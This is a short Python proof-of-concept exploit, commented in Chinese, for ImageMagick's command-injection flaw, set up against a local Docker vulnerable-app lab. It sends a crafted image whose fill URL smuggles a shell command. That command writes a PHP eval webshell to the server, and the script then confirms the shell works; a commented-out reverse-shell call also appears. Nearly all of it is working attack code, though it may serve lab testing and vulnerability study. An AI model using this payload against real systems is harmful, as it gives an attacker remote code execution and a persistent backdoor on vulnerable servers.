#!/usr/bin/env python
# -*- coding: utf-8 -*-
# python version 3.6.4
# 简介：
# 脚本适用于docker下的vulapps环境，使用
# docker run -d -p 80:80 medicean/vulapps:i_imagemagick_1
# 可直接运行。
# 具体信息参见github地址
# https://github.com/Medicean/VulApps/tree/master/i/imagemagick/1

import requests
import base64


def doPost(url, data):
    post_data = {"img": base64.b64encode(data)}
    try:
        requests.post(url + "/poc.php", data=post_data, timeout=1)
    except:
        pass


# 写 webshell
def writeshell(url):
    writeshell = '''push graphic-context
viewbox 0 0 640 480
fill 'url(https://baidu.com/1.jpg"|echo \\'<?php eval($_POST[\\'ant\\']);?>\\' > shell.php")'
pop graphic-context
'''
    doPost(url, writeshell)
    resp2 = requests.post(url + "/shell.php", data={"ant": "echo md5(123);"})
    if resp2.status_code == 200 and "202cb962ac59075b964b07152d234b70" in resp2.content:
        print("WebShell: " + url + "shell.php")

if __name__ == '__main__':
    # 写 webshell
    writeshell("http://127.0.0.1:80/")
    # 反弹 shell
    # reverse_shell("http://127.0.0.1:80/")